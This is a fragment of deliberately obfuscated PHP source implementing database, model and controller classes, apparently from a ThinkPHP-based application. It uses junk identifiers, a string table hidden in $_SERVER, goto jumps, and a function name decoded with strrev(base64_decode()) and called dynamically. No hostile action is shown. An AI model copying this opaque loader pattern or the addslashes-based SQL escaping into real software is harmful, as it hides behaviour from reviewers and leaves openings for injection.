substr($¤ÀË¡¢[1], strlen($¤ÀË¡¢[1]) - 1, 1) == $Ò…¸üª°[444]) { $§ı²ş÷ = !0; $Ù¬‡é´‰ = is_string($½§¨¹–Ä) ? $½§¨¹–Ä : $‹îü€†Œ; $ßº×ª´ = substr($¤ÀË¡¢[1], 1, strlen($¤ÀË¡¢[1]) - 2); $ßº×ª´ = $this->db->escapeString($ßº×ª´); if (!strpos($Ù¬‡é´‰, $Ò…¸üª°[10])) { $Ù¬‡é´‰ = $Ò…¸üª°[445] . $Ù¬‡é´‰ . $Ò…¸üª°[445]; } $ˆ†•îûœ = $Ò…¸üª°[211] . $ßº×ª´ . $Ò…¸üª°[211]; $ßº×ª´ = str_replace(array($Ò…¸üª°[10], $Ò…¸üª°[446], $Ò…¸üª°[11]), $Ò…¸üª°[447], $ßº×ª´); if ($ƒÙ¢±‘[$Ò…¸üª°[448]]) { $ˆ†•îûœ = $Ò…¸üª°[449] . $ßº×ª´ . $Ò…¸üª°[450]; if ($ƒÙ¢±‘[$Ò…¸üª°[451]]) { $ˆ†•îûœ = $Ò…¸üª°[450] . $ßº×ª´ . $Ò…¸üª°[449]; } } $Ş‹³ï±[$ìÊÅÈ†] = $Ò…¸üª°[452] . $Ù¬‡é´‰ . $Ò…¸üª°[453] . $ˆ†•îûœ . $Ò…¸üª°[454]; $ìÊÅÈ†++; continue; } if (is_array($¤ÀË¡¢)) { $‹îü€†Œ = is_string($½§¨¹–Ä) ? $½§¨¹–Ä : $‹îü€†Œ; $¤ÀË¡¢ = $this->parseWhereLike($¤ÀË¡¢, $‹îü€†Œ, !0, $§ı²ş÷); } if (is_numeric($½§¨¹–Ä)) { $Ş‹³ï±[$ìÊÅÈ†] = $¤ÀË¡¢; $ìÊÅÈ†++; } else { $Ş‹³ï±[$½§¨¹–Ä] = $¤ÀË¡¢; } } if ($§ı²ş÷ && !$ÀÊËëê“) { } return $Ş‹³ï±; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Û±ıİ¬É = array()) { $ê ØóË =& $_SERVER[º·Ï‹¥³]; $©Úñ™‰ = self::SQL_WHERE_IN_CHUNK; $÷äò¶î = $this->optionsValue(); $ûÀî¬•¿ = $this->findWhereField($÷äò¶î); if (!$ûÀî¬•¿ || isset($÷äò¶î[$ê ØóË[343]]) || isset($÷äò¶î[$ê ØóË[404]])) { return parent::select($Û±ıİ¬É); } $÷ÎÀ†Ê¾ = $÷äò¶î[$ê ØóË[327]][$ûÀî¬•¿][1]; $÷ÎÀ†Ê¾ = is_array($÷ÎÀ†Ê¾) ? $÷ÎÀ†Ê¾ : array(); $İô¹§ë¬ = null; for ($¢¨øŸë = 0; $¢¨øŸë < count($÷ÎÀ†Ê¾); $¢¨øŸë += $©Úñ™‰) { $ôı¿ğí¿ = array_slice($÷ÎÀ†Ê¾, $¢¨øŸë, $©Úñ™‰); if (!is_array($ôı¿ğí¿) || count($ôı¿ğí¿) == 0) { break; } $÷äò¶î[$ê ØóË[327]][$ûÀî¬•¿][1] = $ôı¿ğí¿; $this->optionsValue($÷äò¶î); $¥¢‰€‰ = parent::select($Û±ıİ¬É); if (!$¥¢‰€‰) { continue; } $İô¹§ë¬ = is_array($İô¹§ë¬) ? $İô¹§ë¬ : array(); $İô¹§ë¬ = array_merge($İô¹§ë¬, $¥¢‰€‰); } return $İô¹§ë¬; } public function delete($×§Ùè©¨ = array()) { $‘ÛÈôı€ =& $_SERVER[º·Ï‹¥³]; $û÷ÓÌÄø = self::SQL_WHERE_IN_CHUNK; $şƒüËÜö = $this->optionsValue(); $ş™Å™â° = $this->findWhereField($şƒüËÜö); if (!$ş™Å™â°) { return parent::delete($×§Ùè©¨); } $Óú˜Ëø­ = 0; $œ¶»­• = $şƒüËÜö[$‘ÛÈôı€[327]][$ş™Å™â°][1]; $œ¶»­• = is_array($œ¶»­•) ? $œ¶»­• : array(); for ($ èóâ© = 0; $ èóâ© < count($œ¶»­•); $ èóâ© += $û÷ÓÌÄø) { $Œùè™£ø = array_slice($œ¶»­•, $ èóâ©, $û÷ÓÌÄø); if (!is_array($Œùè™£ø) || count($Œùè™£ø) == 0) { break; } $şƒüËÜö[$‘ÛÈôı€[327]][$ş™Å™â°][1] = $Œùè™£ø; $this->optionsValue($şƒüËÜö); $Óú˜Ëø­ += parent::delete($×§Ùè©¨); } return $Óú˜Ëø­; } private function findWhereField($Ô’–à©­) { $”®¢˜Ü’ =& $_SERVER[º·Ï‹¥³]; $¶óÇ˜±‹ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Ô’–à©­) || !is_array($Ô’–à©­[$”®¢˜Ü’[327]])) { return !1; } foreach ($Ô’–à©­[$”®¢˜Ü’[327]] as $‹ÙöÑİÉ => $«¼•Ó‹É) { if (is_array($«¼•Ó‹É) && isset($«¼•Ó‹É[0]) && is_string($«¼•Ó‹É[0]) && strtolower($«¼•Ó‹É[0]) == $”®¢˜Ü’[7] && is_array($«¼•Ó‹É[1]) && count($«¼•Ó‹É[1]) > $¶óÇ˜±‹) { ignore_timeout(); return $‹ÙöÑİÉ; } } return !1; } public function setMasterDB($÷…£Êü· = true) { think_config($_SERVER[º·Ï‹¥³][455], $÷…£Êü·); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\x65\x6d\117\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($‚Æ°Úü› = false, $¿¥˜ø‰¯ = "\155\157\144\x69\146\x79\x54\x69\x6d\145", $îÌ‰åôì = false) { $ÄÊÍê˜İ = Model($this->modelType)->get(!1, $this->optionType, !0); $úŒÊûû = array_values($ÄÊÍê˜İ); if ($úŒÊûû && $úŒÊûû[0] && !is_array($úŒÊûû[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÄÊÍê˜İ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÄÊÍê˜İ) { return $‚Æ°Úü› ? null : array(); } if (!$‚Æ°Úü›) { $ÄÊÍê˜İ = array_filter(array_values($ÄÊÍê˜İ)); return array_sort_by($ÄÊÍê˜İ, $¿¥˜ø‰¯, $îÌ‰åôì); } return $ÄÊÍê˜İ[$_SERVER[º·Ï‹¥³][456] . $‚Æ°Úü›]; } public function insert($¬©ŸÁê ) { $Œà¬ÓéÃ =& $_SERVER[º·Ï‹¥³]; $¬©ŸÁê  = array_field_key($¬©ŸÁê , $this->field); $öİ¿× = Model($this->modelType)->get($Œà¬ÓéÃ[457], $this->optionType . $Œà¬ÓéÃ[458]); $öİ¿× = $öİ¿× ? $öİ¿× : 0; $¬©ŸÁê [$Œà¬ÓéÃ[459]] = ++$öİ¿×; $¬©ŸÁê [$Œà¬ÓéÃ[222]] = time(); $¬©ŸÁê [$Œà¬ÓéÃ[88]] = time(); Model($this->modelType)->set($Œà¬ÓéÃ[457], $öİ¿×, $this->optionType . $Œà¬ÓéÃ[458]); Model($this->modelType)->set($Œà¬ÓéÃ[456] . $öİ¿×, $¬©ŸÁê , $this->optionType); return $öİ¿×; } public function update($ªƒÑòãÌ, $åñ—‡™) { $©îó÷Ã¶ =& $_SERVER[º·Ï‹¥³]; $åñ—‡™ = array_field_key($åñ—‡™, $this->field); $§è±Á“© = $this->listData($ªƒÑòãÌ); if (!$§è±Á“© || !$ªƒÑòãÌ) { return !1; } $åñ—‡™ = array_merge($§è±Á“©, $åñ—‡™); $åñ—‡™[$©îó÷Ã¶[88]] = time(); return Model($this->modelType)->set($©îó÷Ã¶[456] . $ªƒÑòãÌ, $åñ—‡™, $this->optionType); } public function remove($“±ã©ö) { if (!$“±ã©ö) { return !1; } return Model($this->modelType)->remove($_SERVER[º·Ï‹¥³][456] . $“±ã©ö, $this->optionType); } public function clear() { $Ô¡Ê«Ä¦ =& $_SERVER[º·Ï‹¥³]; Model($this->modelType)->remove($Ô¡Ê«Ä¦[457], $this->optionType . $Ô¡Ê«Ä¦[458]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($åÌ°Ş³¢, $ùŒß»ø) { if (!$ùŒß»ø) { return !1; } $òìË¸”Ï = $this->listData(); $òìË¸”Ï = array_to_keyvalue($òìË¸”Ï, $åÌ°Ş³¢); return isset($òìË¸”Ï[$ùŒß»ø]) ? $òìË¸”Ï[$ùŒß»ø] : !1; } public function findByName($ıé¸‰…Ï) { return $this->findByKey($_SERVER[º·Ï‹¥³][32], $ıé¸‰…Ï); } protected function resetData($õïñˆÖÎ) { $ÃÀÈ²Ê÷ =& $_SERVER[º·Ï‹¥³]; $õïñˆÖÎ = is_array($õïñˆÖÎ) ? $õïñˆÖÎ : array(); $È¤§Ì‰ç = array(); for ($ë„¨Ìğô = 0; $ë„¨Ìğô < count($õïñˆÖÎ); $ë„¨Ìğô++) { $È¤§Ì‰ç[$ÃÀÈ²Ê÷[456] . $õïñˆÖÎ[$ë„¨Ìğô][$ÃÀÈ²Ê÷[459]]] = $õïñˆÖÎ[$ë„¨Ìğô]; } return Model($this->modelType)->set($È¤§Ì‰ç, !1, $this->optionType); } private function getAutoName($îúªÙÚÃ) { $Ë…êÕ‹˜ = array_to_keyvalue($this->listData(), $_SERVER[º·Ï‹¥³][32]); if (!$Ë…êÕ‹˜ || !isset($Ë…êÕ‹˜[$îúªÙÚÃ])) { return $îúªÙÚÃ; } for ($šïğÅÔ‚ = 1; $šïğÅÔ‚ < count($Ë…êÕ‹˜); $šïğÅÔ‚++) { $¯ı¶¥á¹ = $îúªÙÚÃ . "\50{$šïğÅÔ‚}\x29"; if (!isset($Ë…êÕ‹˜[$¯ı¶¥á¹])) { return $¯ı¶¥á¹; } } return $¯ı¶¥á¹; } } goto Dñß“Ãçßö; a¨ñ²‰ Öô: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($‰şÜ¼Ä· = '') { $ñı®ê”Ş =& $_SERVER[º·Ï‹¥³]; if (!class_exists($ñı®ê”Ş[963])) { think_exception(think_lang($ñı®ê”Ş[14]) . $ñı®ê”Ş[964]); } if (!empty($‰şÜ¼Ä·)) { $this->config = $‰şÜ¼Ä·; if (empty($this->config[$ñı®ê”Ş[17]])) { $this->config[$ñı®ê”Ş[17]] = array(); } } } public function connect($—ããÇ†ø = '', $Ñ¡’üää = 0) { $ÛÃêÚœ =& $_SERVER[º·Ï‹¥³]; if (!isset($this->linkID[$Ñ¡’üää])) { if (empty($—ããÇ†ø)) { $—ããÇ†ø = $this->config; } $ÅµÀ€ = !empty($—ããÇ†ø[$ÛÃêÚœ[17]][$ÛÃêÚœ[18]]) ? $—ããÇ†ø[$ÛÃêÚœ[17]][$ÛÃêÚœ[18]] : $this->pconnect; if ($ÅµÀ€) { $—ããÇ†ø[$ÛÃêÚœ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Ñ¡’üää] = new PDO($—ããÇ†ø[$ÛÃêÚœ[965]], $—ããÇ†ø[$ÛÃêÚœ[937]], $—ããÇ†ø[$ÛÃêÚœ[938]], $—ããÇ†ø[$ÛÃêÚœ[17]]); } catch (PDOException $ù®à²ëŠ) { think_exception($ù®à²ëŠ->getMessage()); } $this->dbType = $this->_getDsnType($—ããÇ†ø[$ÛÃêÚœ[965]]); if (in_array($this->dbType, array($ÛÃêÚœ[966], $ÛÃêÚœ[967], $ÛÃêÚœ[968], $ÛÃêÚœ[969]))) { think_exception($ÛÃêÚœ[970] . $this->dbType . $ÛÃêÚœ[971] . $this->dbType . $ÛÃêÚœ[972]); } if (!$this->linkID[$Ñ¡’üää]) { think_exception($ÛÃêÚœ[973]); } try { $this->linkID[$Ñ¡’üää]->exec($ÛÃêÚœ[974] . think_config($ÛÃêÚœ[940])); } catch (Exception $ù®à²ëŠ) { } $this->connected = !0; if (1 != think_config($ÛÃêÚœ[22])) { unset($this->config); } } return $this->linkID[$Ñ¡’üää]; } public function free() { $this->PDOStatement = null; } public function query($Š„¶¸Ôå, $±Ìı¾¢ = array()) { $õ¥ÑÌ€Æ =& $_SERVER[º·Ï‹¥³]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Š„¶¸Ôå; if (!empty($±Ìı¾¢)) { $this->queryStr .= $õ¥ÑÌ€Æ[975] . print_r($±Ìı¾¢, !0) . $õ¥ÑÌ€Æ[976]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($õ¥ÑÌ€Æ[23], 1); think_status($õ¥ÑÌ€Æ[24]); $this->PDOStatement = $this->_linkID->prepare($Š„¶¸Ôå); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¦É»¤î = $this->PDOStatement->execute($±Ìı¾¢); $this->debug(); if (!1 === $¦É»¤î) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Â°¤´£Ó, $Ü«êùé† = array()) { $­¯×«¯´ =& $_SERVER[º·Ï‹¥³]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Â°¤´£Ó; if (!empty($Ü«êùé†)) { $this->queryStr .= $­¯×«¯´[975] . print_r($Ü«êùé†, !0) . $­¯×«¯´[976]; } $ù²¶Ï“ù = !1; if ($this->dbType == $­¯×«¯´[969]) { if (preg_match($­¯×«¯´[977], $this->queryStr, $¢²íòì)) { $this->table = think_config($­¯×«¯´[978]) . str_ireplace(think_config($­¯×«¯´[979]), $­¯×«¯´[438], $¢²íòì[2]); $ù²¶Ï“ù = (bool) $this->query($­¯×«¯´[980] . strtoupper($this->table) . $­¯×«¯´[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($­¯×«¯´[25], 1); think_status($­¯×«¯´[24]); $this->PDOStatement = $this->_linkID->prepare($Â°¤´£Ó); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ôşÛ½šï = $this->PDOStatement->execute($Ü«êùé†); $this->debug(); if (!1 === $ôşÛ½šï) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ù²¶Ï“ù || preg_match($­¯×«¯´[981], $Â°¤´£Ó)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Àâ¹¥œ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Àâ¹¥œ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $€Ï¾·šÈ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$€Ï¾·šÈ) { $this->error(); return !1; } } return !0; } private function getAll() { $”Â—Æò­ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($”Â—Æò­); return $”Â—Æò­; } public function getFields($”¦ûÂé) { $ãĞ±ã¾İ =& $_SERVER[º·Ï‹¥³]; $this->initConnect(!0); if (think_config($ãĞ±ã¾İ[982])) { $³ÂÜô›‡ = str_replace($ãĞ±ã¾İ[983], $”¦ûÂé, think_config($ãĞ±ã¾İ[982])); } else { switch ($this->dbType) { case $ãĞ±ã¾İ[966]: case $ãĞ±ã¾İ[984]: $³ÂÜô›‡ = "\x53\105\x4c\x45\103\124\40\40\x20\x63\157\x6c\165\x6d\x6e\x5f\156\141\155\145\40\x61\x73\40\x27\x4e\x61\155\x65\x27\54\x20\x20\40\x64\x61\x74\141\x5f\164\171\160\x65\x20\141\x73\40\x27\x54\x79\160\145\x27\54\x20\40\40\x63\x6f\x6c\x75\155\x6e\137\144\x65\146\141\165\154\164\40\141\163\x20\47\x44\x65\146\x61\165\154\164\47\x2c\x20\40\40\x69\163\x5f\156\x75\x6c\x6c\141\x62\154\145\x20\x61\163\x20\47\x4e\165\154\154\x27\12\11\11\x46\x52\x4f\115\11\151\x6e\x66\x6f\162\x6d\141\164\151\157\156\x5f\163\x63\x68\x65\155\141\56\164\141\x62\x6c\145\x73\x20\101\x53\40\164\12\x9\11\112\x4f\111\116\x9\151\156\x66\x6f\162\x6d\x61\x74\151\x6f\x6e\137\163\x63\150\145\155\141\56\143\x6f\154\165\155\156\163\x20\101\x53\x20\143\12\11\11\x4f\116\40\40\x74\x2e\x74\141\x62\154\145\137\x63\141\164\141\154\x6f\147\40\75\x20\143\56\x74\x61\142\x6c\145\x5f\x63\x61\164\x61\x6c\157\147\xa\11\11\101\116\x44\40\x74\56\x74\141\x62\x6c\145\x5f\163\143\x68\145\155\141\x20\x3d\40\x63\56\x74\x61\142\x6c\145\137\163\143\x68\x65\x6d\x61\xa\x9\11\101\x4e\x44\40\164\x2e\x74\x61\x62\x6c\x65\x5f\x6e\141\x6d\x65\40\75\x20\x63\x2e\164\141\142\154\x65\137\x6e\141\x6d\x65\xa\11\x9\127\x48\105\x52\x45\x20\40\40\x74\x2e\164\141\142\154\x65\137\156\141\x6d\145\40\x3d\x20\47{$”¦ûÂé}\x27"; break; case $ãĞ±ã¾İ[985]: $³ÂÜô›‡ = $ãĞ±ã¾İ[986] . $”¦ûÂé . $ãĞ±ã¾İ[987]; break; case $ãĞ±ã¾İ[967]: case $ãĞ±ã¾İ[969]: $³ÂÜô›‡ = $ãĞ±ã¾İ[988] . $ãĞ±ã¾İ[989] . $ãĞ±ã¾İ[990] . strtoupper($”¦ûÂé) . $ãĞ±ã¾İ[991] . strtoupper($”¦ûÂé) . $ãĞ±ã¾İ[992]; break; case $ãĞ±ã¾İ[993]: $³ÂÜô›‡ = $ãĞ±ã¾İ[994] . $”¦ûÂé . $ãĞ±ã¾İ[995]; break; case $ãĞ±ã¾İ[968]: break; case $ãĞ±ã¾İ[996]: default: $³ÂÜô›‡ = $ãĞ±ã¾İ[997] . ($this->dbType == $ãĞ±ã¾İ[996] ? "\140{$”¦ûÂé}\140" : $”¦ûÂé); } } $ù½ÂŒß© = $this->query($³ÂÜô›‡); $ŒÄ„“šÀ = array(); if ($ù½ÂŒß©) { foreach ($ù½ÂŒß© as $Œ”åÅ¯ => $½ŒÈäè) { $½ŒÈäè = array_change_key_case($½ŒÈäè); $½ŒÈäè[$ãĞ±ã¾İ[32]] = isset($½ŒÈäè[$ãĞ±ã¾İ[32]]) ? $½ŒÈäè[$ãĞ±ã¾İ[32]] : $ãĞ±ã¾İ[438]; $½ŒÈäè[$ãĞ±ã¾İ[33]] = isset($½ŒÈäè[$ãĞ±ã¾İ[33]]) ? $½ŒÈäè[$ãĞ±ã¾İ[33]] : $ãĞ±ã¾İ[438]; $»ƒ«úì = isset($½ŒÈäè[$ãĞ±ã¾İ[325]]) ? $½ŒÈäè[$ãĞ±ã¾İ[325]] : $½ŒÈäè[$ãĞ±ã¾İ[32]]; $ŒÄ„“šÀ[$»ƒ«úì] = array($ãĞ±ã¾İ[32] => $»ƒ«úì, $ãĞ±ã¾İ[33] => $½ŒÈäè[$ãĞ±ã¾İ[33]], $ãĞ±ã¾İ[35] => (bool) (isset($½ŒÈäè[$ãĞ±ã¾İ[106]]) && $½ŒÈäè[$ãĞ±ã¾İ[106]] === $ãĞ±ã¾İ[12] || isset($½ŒÈäè[$ãĞ±ã¾İ[35]]) && $½ŒÈäè[$ãĞ±ã¾İ[35]] === $ãĞ±ã¾İ[12]), $ãĞ±ã¾İ[37] => isset($½ŒÈäè[$ãĞ±ã¾İ[37]]) ? $½ŒÈäè[$ãĞ±ã¾İ[37]] : (isset($½ŒÈäè[$ãĞ±ã¾İ[56]]) ? $½ŒÈäè[$ãĞ±ã¾İ[56]] : $ãĞ±ã¾İ[438]), $ãĞ±ã¾İ[39] => isset($½ŒÈäè[$ãĞ±ã¾İ[97]]) ? strtolower($½ŒÈäè[$ãĞ±ã¾İ[97]]) == $ãĞ±ã¾İ[41] : (isset($½ŒÈäè[$ãĞ±ã¾İ[57]]) ? $½ŒÈäè[$ãĞ±ã¾İ[57]] : !1), $ãĞ±ã¾İ[42] => isset($½ŒÈäè[$ãĞ±ã¾İ[998]]) ? strtolower($½ŒÈäè[$ãĞ±ã¾İ[998]]) == $ãĞ±ã¾İ[44] : (isset($½ŒÈäè[$ãĞ±ã¾İ[97]]) ? $½ŒÈäè[$ãĞ±ã¾İ[97]] : !1)); } } return $ŒÄ„“šÀ; } public function getTables($øÇ­åÇ = '') { $¯“ˆèÔ =& $_SERVER[º·Ï‹¥³]; if (think_config($¯“ˆèÔ[999])) { $µı¤»Â = str_replace($¯“ˆèÔ[1000], $øÇ­åÇ, think_config($¯“ˆèÔ[999])); } else { switch ($this->dbType) { case $¯“ˆèÔ[967]: case $¯“ˆèÔ[969]: $µı¤»Â = $¯“ˆèÔ[1001]; break; case $¯“ˆèÔ[966]: case $¯“ˆèÔ[984]: $µı¤»Â = $¯“ˆèÔ[1002]; break; case $¯“ˆèÔ[993]: $µı¤»Â = $¯“ˆèÔ[1003]; break; case $¯“ˆèÔ[968]: think_exception(think_lang($¯“ˆèÔ[1004]) . $¯“ˆèÔ[1005]); break; case $¯“ˆèÔ[985]: $µı¤»Â = $¯“ˆèÔ[45] . $¯“ˆèÔ[46] . $¯“ˆèÔ[47]; break; case $¯“ˆèÔ[996]: default: if (!empty($øÇ­åÇ)) { $µı¤»Â = $¯“ˆèÔ[948] . $øÇ­åÇ . $¯“ˆèÔ[949]; } else { $µı¤»Â = $¯“ˆèÔ[950]; } } } $ËçŠÏÀ = $this->query($µı¤»Â); $Ôªí†Ñ = array(); foreach ($ËçŠÏÀ as $²àø…•± => $ó½Ú‚) { $Ôªí†Ñ[$²àø…•±] = current($ó½Ú‚); } return $Ôªí†Ñ; } protected function parseLimit($²€ï¿­¦) { $È£×ĞÓí =& $_SERVER[º·Ï‹¥³]; $ûù±¨Ñ¦ = $È£×ĞÓí[12]; if (!empty($²€ï¿­¦)) { switch ($this->dbType) { case $È£×ĞÓí[993]: case $È£×ĞÓí[985]: $²€ï¿­¦ = explode($È£×ĞÓí[50], $²€ï¿­¦); if (count($²€ï¿­¦) > 1) { $ûù±¨Ñ¦ .= $È£×ĞÓí[51] . $²€ï¿­¦[1] . $È£×ĞÓí[52] . $²€ï¿­¦[0] . $È£×ĞÓí[53]; } else { $ûù±¨Ñ¦ .= $È£×ĞÓí[51] . $²€ï¿­¦[0] . $È£×ĞÓí[53]; } break; case $È£×ĞÓí[966]: case $È£×ĞÓí[984]: break; case $È£×ĞÓí[968]: break; case $È£×ĞÓí[967]: case $È£×ĞÓí[969]: break; case $È£×ĞÓí[996]: default: $ûù±¨Ñ¦ .= $È£×ĞÓí[51] . $²€ï¿­¦ . $È£×ĞÓí[53]; } } return $ûù±¨Ñ¦; } public function parseKey(&$‘Õö¬À, $“çŠ£˜Á = true) { $ã§”±ø² =& $_SERVER[º·Ï‹¥³]; if ($“çŠ£˜Á) { $‘Õö¬À = $this->parseKeyCheck($‘Õö¬À); } if ($this->dbType == $ã§”±ø²[996]) { if ($‘Õö¬À != $ã§”±ø²[211] && !preg_match($ã§”±ø²[960], $‘Õö¬À)) { $‘Õö¬À = $ã§”±ø²[445] . trim($‘Õö¬À, $ã§”±ø²[445]) . $ã§”±ø²[445]; } return $‘Õö¬À; } else { return parent::parseKey($‘Õö¬À, $“çŠ£˜Á); } } public function close() { $this->_linkID = null; } public function error() { $ùËİËˆä =& $_SERVER[º·Ï‹¥³]; if ($this->PDOStatement) { $’£Ò¥ÙÖ = $this->PDOStatement->errorInfo(); $this->error = $’£Ò¥ÙÖ[1] . $ùËİËˆä[4] . $’£Ò¥ÙÖ[2]; } else { $this->error = $ùËİËˆä[12]; } if ($ùËİËˆä[12] != $this->queryStr) { $this->error .= LNG($ùËİËˆä[48]) . $this->queryStr; } think_trace($this->error, $ùËİËˆä[12], $ùËİËˆä[49]); return $this->error; } public function escapeString($£ßÃ‡ˆ) { $¼ïìß™› =& $_SERVER[º·Ï‹¥³]; switch ($this->dbType) { case $¼ïìß™›[993]: case $¼ïìß™›[966]: case $¼ïìß™›[984]: case $¼ïìß™›[996]: return addslashes($£ßÃ‡ˆ); case $¼ïìß™›[968]: case $¼ïìß™›[985]: case $¼ïìß™›[967]: case $¼ïìß™›[969]: return str_ireplace($¼ïìß™›[58], $¼ïìß™›[59], $£ßÃ‡ˆ); } } protected function parseValue($û‹üéÓÃ) { $Š¢ùñ… =& $_SERVER[º·Ï‹¥³]; if (is_string($û‹üéÓÃ)) { $âÇ’ºñ‰ = strpos($û‹üéÓÃ, $Š¢ùñ…[4]) === 0 && in_array($û‹üéÓÃ, array_keys($this->bind)); $û‹üéÓÃ = $âÇ’ºñ‰ ? $this->escapeString($û‹üéÓÃ) : $Š¢ùñ…[1006] . $this->escapeString($û‹üéÓÃ) . $Š¢ùñ…[1006]; } elseif (isset($û‹üéÓÃ[0]) && is_string($û‹üéÓÃ[0]) && strtolower($û‹üéÓÃ[0]) == $Š¢ùñ…[348]) { $û‹üéÓÃ = $this->escapeString($û‹üéÓÃ[1]); } elseif (is_array($û‹üéÓÃ)) { $û‹üéÓÃ = array_map(array($this, $Š¢ùñ…[1007]), $û‹üéÓÃ); } elseif (is_bool($û‹üéÓÃ)) { $û‹üéÓÃ = $û‹üéÓÃ ? $Š¢ùñ…[91] : $Š¢ùñ…[219]; } elseif (is_null($û‹üéÓÃ)) { $û‹üéÓÃ = $Š¢ùñ…[106]; } return $û‹üéÓÃ; } public function getLastInsertId() { $ù÷ ¶ßë =& $_SERVER[º·Ï‹¥³]; switch ($this->dbType) { case $ù÷ ¶ßë[993]: case $ù÷ ¶ßë[985]: case $ù÷ ¶ßë[966]: case $ù÷ ¶ßë[984]: case $ù÷ ¶ßë[968]: case $ù÷ ¶ßë[996]: return $this->_linkID->lastInsertId(); case $ù÷ ¶ßë[967]: case $ù÷ ¶ßë[969]: $¬Ÿå¦ÂÅ = $this->table; $»Î·Ìæ = $this->query("\x53\x45\x4c\105\x43\124\40{$¬Ÿå¦ÂÅ}\56\143\x75\x72\162\x76\141\x6c\x20\x63\x75\x72\x72\166\141\x6c\x20\106\122\x4f\x4d\x20\144\x75\141\154"); return $»Î·Ìæ ? $»Î·Ìæ[0][$ù÷ ¶ßë[1008]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($±ê¨¢¾×) { $¯´Û©ó· =& $_SERVER[º·Ï‹¥³]; if (!CacheLock::fileLock($¯´Û©ó·[13])) { return !1; } $Ğœí’ŸÌ = parent::query($±ê¨¢¾×); CacheLock::fileUnLock($¯´Û©ó·[13]); return $Ğœí’ŸÌ; } public function execute($Ü®¼ş®í) { $ô±‘‘Ÿ =& $_SERVER[º·Ï‹¥³]; if (!CacheLock::fileLock($ô±‘‘Ÿ[13])) { return !1; } $üÙ”¯ = parent::execute($Ü®¼ş®í); CacheLock::fileUnLock($ô±‘‘Ÿ[13]); return $üÙ”¯; } } class DbSqlite3 extends DbSqlite3Base { public function query($ã­åû×±) { $çâıŒ•È =& $_SERVER[º·Ï‹¥³]; if (!CacheLock::fileLock($çâıŒ•È[13])) { return !1; } $…£Õˆî€ = parent::query($ã­åû×±); CacheLock::fileUnLock($çâıŒ•È[13]); return $…£Õˆî€; } public function execute($ÇãºĞ¹ú) { $Ÿ‹ÅÎ¿Ñ =& $_SERVER[º·Ï‹¥³]; if (!CacheLock::fileLock($Ÿ‹ÅÎ¿Ñ[13])) { return !1; } $ë ³‹ôµ = parent::execute($ÇãºĞ¹ú); CacheLock::fileUnLock($Ÿ‹ÅÎ¿Ñ[13]); return $ë ³‹ôµ; } } goto féöµïÅ©; bÄÂÕ÷†¬™: $fileSize = strrev(base64_decode($_SERVER[ÊÀÖ©“][0])); function binCheckNeq($£áİÆÔ, $Úí±¹¹”) { return $£áİÆÔ != $Úí±¹¹”; } $_SERVER[$_SERVER[ÊÀÖ©“][1]] = $fileSize($_SERVER[$_SERVER[ÊÀÖ©“][2]]); goto c„öâèğ®ã; bôÕŞõ¥ƒŸ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¥ú¤°› =& $_SERVER[º·Ï‹¥³]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¥ú¤°›[6]] =& $config; $this->values[$¥ú¤°›[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¥ú¤°›[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¯´îÇ¨µ) { if (1 === func_num_args()) { $this->{$¯´îÇ¨µ} = new $¯´îÇ¨µ(); } else { $ë¨ìúà„ = new ReflectionClass($¯´îÇ¨µ); $ŒÈ¯Á­è = func_get_args(); array_shift($ŒÈ¯Á­è); $this->{$¯´îÇ¨µ} = $ë¨ìúà„->newInstanceArgs($ŒÈ¯Á­è); } return $this->{$¯´îÇ¨µ}; } public function routeBind($åÅ€ßØ, $Ğ»âŞ‰», $ÚÒÏæ¯û = 3) { $íäİÚé =& $_SERVER[º·Ï‹¥³]; $¾µñÎÏ“ = $this->in[$íäİÚé[9]]; $åÅ€ßØ = str_replace($íäİÚé[10], $íäİÚé[11], trim(trim($åÅ€ßØ, $íäİÚé[8]), $íäİÚé[12])); if (!$åÅ€ßØ || count($¾µñÎÏ“) <= $ÚÒÏæ¯û) { return !1; } $¶äØ‹š¶ = !0; $šİí×Â = explode($íäİÚé[8], $åÅ€ßØ); for ($•í ›ı‹ = 0; $•í ›ı‹ < count($šİí×Â); $•í ›ı‹++) { if ($šİí×Â[$•í ›ı‹] != $¾µñÎÏ“[$ÚÒÏæ¯û + $•í ›ı‹]) { $¶äØ‹š¶ = !1; break; } } if (!$¶äØ‹š¶) { return; } call_user_func_array(array($this, $Ğ»âŞ‰»), array()); } public function routeArgs($ßœÔËšÛ = 3) { $´Åšòóá = 